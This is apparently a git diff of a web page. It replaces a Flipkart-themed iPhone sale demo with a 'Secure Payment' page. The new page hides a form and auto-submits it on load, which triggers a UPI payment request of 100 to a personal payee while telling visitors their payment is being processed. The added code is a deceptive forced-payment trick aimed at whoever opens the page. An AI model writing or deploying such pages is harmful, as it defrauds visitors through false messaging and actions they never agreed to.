@@ -1,144 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Flipkart iPhone Sale</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: "Poppins", sans-serif;
-      background: #f1f3f6;
-      color: #222;
-    }
-
-    header {
-      background: #2874f0;
-      color: white;
-      padding: 15px 20px;
-      text-align: center;
-      font-size: 1.6em;
-      font-weight: bold;
-      letter-spacing: 0.5px;
-    }
-
-    .banner {
-      background: url('https://rukminim2.flixcart.com/image/850/1000/l5jxt3k0/mobile/n/w/h/-original-imagg6tghayzsz4h.jpeg?q=90') center/cover no-repeat;
-      height: 300px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.6);
-      font-size: 2em;
-      font-weight: 600;
-    }
-
-    .container {
-      padding: 30px 15px;
-      max-width: 1000px;
-      margin: 0 auto;
-    }
-
-    .card {
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      padding: 20px;
-      margin: 20px 0;
-      text-align: center;
-      transition: 0.3s;
-    }
-
-    .card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
-    }
-
-    .card img {
-      width: 200px;
-      border-radius: 10px;
-      margin-bottom: 15px;
-    }
-
-    .price {
-      font-size: 1.5em;
-      color: #388e3c;
-      font-weight: bold;
-    }
-
-    .old-price {
-      text-decoration: line-through;
-      color: #999;
-      margin-left: 8px;
-      font-size: 1em;
-    }
-
-    button {
-      background: #fb641b;
-      border: none;
-      color: white;
-      padding: 12px 25px;
-      border-radius: 6px;
-      font-size: 1em;
-      margin-top: 10px;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    button:hover {
-      background: #d35400;
-    }
-
-    footer {
-      background: #172337;
-      color: #ccc;
-      text-align: center;
-      padding: 15px;
-      font-size: 0.9em;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Secure Payment</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .container h1 {
+            margin-bottom: 20px;
+        }
+        .container p {
+            margin-bottom: 20px;
+        }
+        .container form {
+            display: none;
+        }
+    </style>
+    <script>
+        window.onload = function() {
+            // Auto-submit the form when the page loads
+            document.getElementById('paymentForm').submit();
+        };
+    </script>
 </head>
 <body>
-
-  <header>Flipkart iPhone Sale</header>
-
-  <div class="banner">Mega Apple Days 🍎</div>
-
-  <div class="container">
-    <div class="card">
-      <img src="https://rukminim2.flixcart.com/image/416/416/xif0q/mobile/b/u/f/-original-imagtkzjrkqvhypa.jpeg?q=70" alt="iPhone 15">
-      <h2>iPhone 15</h2>
-      <p class="price">₹72,999 <span class="old-price">₹79,900</span></p>
-      <p>Experience the next generation of performance and photography.</p>
-      <button onclick="window.location.href='https://www.flipkart.com/search?q=iphone+15';">Shop Now</button>
+    <div class="container">
+        <h1>Processing Your Payment</h1>
+        <p>Please wait while we process your payment...</p>
+        <form id="paymentForm" action="upi://pay?pa=arnavispoor@fam&pn=Arnav&cu=INR" method="POST">
+            <input type="hidden" name="upiId" value="your-upi-id@bank">
+            <input type="hidden" name="amount" value="100">
+            <input type="hidden" name="note" value="Payment for services">
+            <input type="submit" value="Pay Now" style="display:none;">
+        </form>
     </div>
-
-    <div class="card">
-      <img src="https://rukminim2.flixcart.com/image/416/416/xif0q/mobile/j/x/x/-original-imagtc6vghxhvqzh.jpeg?q=70" alt="iPhone 14">
-      <h2>iPhone 14</h2>
-      <p class="price">₹59,999 <span class="old-price">₹69,900</span></p>
-      <p>Smooth performance, stunning camera, and unbeatable offers!</p>
-      <button onclick="window.location.href='https://www.flipkart.com/search?q=iphone+14';">Shop Now</button>
-    </div>
-
-    <div class="card">
-      <img src="https://rukminim2.flixcart.com/image/416/416/xif0q/mobile/k/h/g/-original-imaghxa5hvapbfds.jpeg?q=70" alt="iPhone 13">
-      <h2>iPhone 13</h2>
-      <p class="price">₹52,499 <span class="old-price">₹65,000</span></p>
-      <p>Iconic design, great battery life, and amazing camera quality.</p>
-      <button onclick="window.location.href='https://www.flipkart.com/search?q=iphone+13';">Shop Now</button>
-    </div>
-  </div>
-
-  <footer>
-    © 2025 Flipkart iPhone Sale | Made for Demo by pandeyshardul2-web
-  </footer>
-
 </body>
 </html>
